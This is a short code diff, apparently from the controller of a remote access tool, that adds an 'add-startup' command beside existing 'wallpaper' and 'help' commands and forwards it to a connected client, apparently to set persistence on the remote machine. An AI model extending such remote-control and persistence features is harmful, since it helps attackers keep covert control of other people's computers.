@@ -319,6 +319,9 @@ int main(int argc, char* argv[])
                     printf("[!] Usage: wallpaper <file>\n");
                 }
             }
+            else if (command == "add-startup") {
+                SendAndReceive(client, command);
+            }
 
             else if (command == "help") {
                 help_menu();
